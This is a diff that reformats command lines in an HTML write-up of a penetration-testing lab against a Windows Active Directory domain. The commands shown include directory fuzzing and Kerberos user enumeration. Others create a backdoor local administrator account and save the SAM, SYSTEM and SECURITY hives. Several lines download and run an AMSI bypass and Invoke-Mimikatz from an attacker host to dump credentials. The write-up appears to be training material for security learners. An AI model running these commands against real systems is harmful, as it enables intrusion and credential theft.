@@ -669,14 +669,14 @@ sudo apt install -y dnsmasq</p>
 <p>Then we need to do some small configurations. We will make dnsmasq to use /etc/hosts file to read the machines configured on the file for the translation.
 Let’s config the /etc/hosts file and add the IPs of the machines we need and their names.</p>
 
-<p>sudo vim /etc/hosts</p>
+<pre><code>sudo vim /etc/hosts</code></pre>
 
 <img src="./images/screenshot_4.png" alt="">
 
 <p>Now we edit the /etc/resolv.conf file and add the follow configuration.</p>
 
-<p>sudo vim /etc/resolv.conf
-nameserver 127.0.0.1</p>
+<pre><code>sudo vim /etc/resolv.conf
+nameserver 127.0.0.1</code></pre>
 
 <img src="./images/screenshot_5.png" alt="">
 
@@ -774,7 +774,7 @@ olivia@academy.ninja.lan </code></pre>
 
 <p>I then decided to do a fuzzing on the webapp to test the web application and find out if I would be able to find any possible hidden files or even a hidden directory Within the webapp that could lead to any possible juicy information. </p>
 
-<p>feroxbuster -A -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -W 156,95 --url http://web.academy.ninja.lan</p>
+<pre><code>feroxbuster -A -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -W 156,95 --url http://web.academy.ninja.lan</code></pre>
 
 <pre><code>|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
 |    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
@@ -838,7 +838,7 @@ For this we can user Kerbrute: https://github.com/ropnop/kerbrute/releases/tag/v
 
 <li>Response Analysis: Analyzes the KDC's responses to determine valid usernames and passwords. </li>
 
-<p>./kerbrute_linux userenum -d academy.ninja.lan --dc dc-ac.academy.ninja.lan users.txt</p>
+<pre><code>./kerbrute_linux userenum -d academy.ninja.lan --dc dc-ac.academy.ninja.lan users.txt</code></pre>
 
 <pre><code>    __             __               __     
    / /_____  _____/ /_  _______  __/ /____ 
@@ -1190,8 +1190,8 @@ IEX(IWR http://192.168.58.1:8080/AMSI_Bypass.txt -UseBasicParsing); Invoke-Evasi
 <p>We can see above that we were able to bypass AV and get a new reverse shell as NT AUTHORITY\SYSTEM.
 I just decided now to create a new user and add it to the local Administrators group, this way we can also access the host using Evil-WinRM and have a better interactive remote access.</p>
 
-<p>net user stark Stark123! /add
-net localgroup Administrators stark /add</p>
+<pre><code>net user stark Stark123! /add
+net localgroup Administrators stark /add</code></pre>
 
 <img src="./images/screenshot_30.png" alt="">
 
@@ -1206,9 +1206,9 @@ The key reason this works is that Windows stores sensitive information in the SA
 
 <p>Since we do have a valid local account and we also know that this user is part of local Administrator, we can dump the SYSTEM, SAM AND SECURITY and use secretsdump.py locally on our attacking machine.</p>
 
-<p>reg save HKLM\SAM C:\SAM
+<pre><code>reg save HKLM\SAM C:\SAM
 reg save HKLM\SYSTEM C:\SYSTEM
-reg save HKLM\SECURITY C:\SECURITY</p>
+reg save HKLM\SECURITY C:\SECURITY</code></pre>
 
 <img src="./images/screenshot_32.png" alt="">
 
@@ -1597,8 +1597,8 @@ export KRB5CCNAME=Administrator@cifs_web.academy.ninja.lan@ACADEMY.NINJA.LAN.cca
 
 <p>I just decided now to create another user and add it to the local Administrators group inside web.academy.ninja.lan, this way we can also access the host using Evil-WinRM and have a better interactive remote access.</p>
 
-<p>net user stark Stark123! /add
-net localgroup Administrators stark /add</p>
+<pre><code>net user stark Stark123! /add
+net localgroup Administrators stark /add</code></pre>
 
 <img src="./images/screenshot_46.png" alt="">
 
@@ -1611,8 +1611,8 @@ net localgroup Administrators stark /add</p>
 <p>Now that we have Local Administrator permission and we have access with Evil-WinRM we can use Invoke-Mimikatz.ps1 to dump the credentials.
 The one liner was not working, so I had to bypass AMSI first, then I executed Invoke-Mimikatz.</p>
 
-<p>IEX(IWR http://192.168.58.1:8080/AMSI_Bypass.txt -UseBasicParsing); Invoke-Evasion;
-IEX(IWR http://192.168.58.1:8080/Invoke-Mimikatz.ps1 -UseBasicParsing); Invoke-Mimikatz -Command '"sekurlsa::ekeys"'</p>
+<pre><code>IEX(IWR http://192.168.58.1:8080/AMSI_Bypass.txt -UseBasicParsing); Invoke-Evasion;
+IEX(IWR http://192.168.58.1:8080/Invoke-Mimikatz.ps1 -UseBasicParsing); Invoke-Mimikatz -Command '"sekurlsa::ekeys"'</code></pre>
 
 <pre><code>  .#####.   mimikatz 2.2.0 (x64) #19041 Jul 24 2021 11:00:11
  .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
@@ -1922,8 +1922,8 @@ frank           Person       Constrained w/ Protocol Transition  eventlog/share.
 
 <p>As we did previously, let’s add our a new user and make it local admin member, but </p>
 
-<p>net user stark Stark123! /add
-net localgroup Administrators stark /add</p>
+<pre><code>net user stark Stark123! /add
+net localgroup Administrators stark /add</code></pre>
 
 <img src="./images/screenshot_53.png" alt="">
 
@@ -1937,9 +1937,9 @@ evil-winrm -i 'share.academy.ninja.lan' -u 'stark' -p 'Stark123!'</p>
 <p>Now that we have Local Administrator permission and we have access with Evil-WinRM we can use Invoke-Mimikatz.ps1 to dump the credentials.
 We have to bypass AMSI first, then I executed Invoke-Mimikatz.</p>
 
-<p>IEX(IWR http://192.168.58.1:8080/AMSI_Bypass.txt -UseBasicParsing); Invoke-Evasion;</p>
+<pre><code>IEX(IWR http://192.168.58.1:8080/AMSI_Bypass.txt -UseBasicParsing); Invoke-Evasion;</code></pre>
 
-<p>IEX(IWR http://192.168.58.1:8080/Invoke-Mimikatz.ps1 -UseBasicParsing); Invoke-Mimikatz -Command '"sekurlsa::ekeys"'</p>
+<pre><code>IEX(IWR http://192.168.58.1:8080/Invoke-Mimikatz.ps1 -UseBasicParsing); Invoke-Mimikatz -Command '"sekurlsa::ekeys"'</code></pre>
 
 <p>Now let’s use mimikatz again to dump the creds.</p>
 
@@ -2209,7 +2209,7 @@ sudo ldeep ldap -u 'backup' -p 'Stark123!Backup' -d 'academy.ninja.lan' -s 'ldap
 }]
 </code></pre>
 
-<p>sudo ldeep ldap -u 'Domain Admins' -p 'Stark123!Backup' -d 'academy.ninja.lan' -s 'ldap://dc-ac.academy.ninja.lan' search '(sAMAccountName=Domain Admins)' distinguishedName</p>
+<pre><code>sudo ldeep ldap -u 'Domain Admins' -p 'Stark123!Backup' -d 'academy.ninja.lan' -s 'ldap://dc-ac.academy.ninja.lan' search '(sAMAccountName=Domain Admins)' distinguishedName</code></pre>
 
 <pre><code>[{
   "distinguishedName": "CN=Domain Admins,CN=Users,DC=academy,DC=ninja,DC=lan",
@@ -2583,7 +2583,7 @@ dacledit.py -action 'write' -rights 'FullControl' -principal 'rachel.philips' -t
 <p>Now that we were able to give GenericAll right to the JONIN group, we can now add Rachel.Philips to the JONIN group.
 Using ldeep, we can now Add user Rachel.Philips into JONIN group.</p>
 
-<p>sudo ldeep ldap -u 'rachel.philips' -H ':9755a3421982f684f66d411f661da264' -d 'ninja.hacker' -s 'ldap://dc-vil.ninja.hack' add_to_group "CN=rachel.philips,CN=Users,DC=ninja,DC=hack" "CN=JONIN,CN=Users,DC=ninja,DC=hack”</p>
+<pre><code>sudo ldeep ldap -u 'rachel.philips' -H ':9755a3421982f684f66d411f661da264' -d 'ninja.hacker' -s 'ldap://dc-vil.ninja.hack' add_to_group "CN=rachel.philips,CN=Users,DC=ninja,DC=hack" "CN=JONIN,CN=Users,DC=ninja,DC=hack”</code></pre>
 
 <img src="./images/screenshot_84.png" alt="">
 
